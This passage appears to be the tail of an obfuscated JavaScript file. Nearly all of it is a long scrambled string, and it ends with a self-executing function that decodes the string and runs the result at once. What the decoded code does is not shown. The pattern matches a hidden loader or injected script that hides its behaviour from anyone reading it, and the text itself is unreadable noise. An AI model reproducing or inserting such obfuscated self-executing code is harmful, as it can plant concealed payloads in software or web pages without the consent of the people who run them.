3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
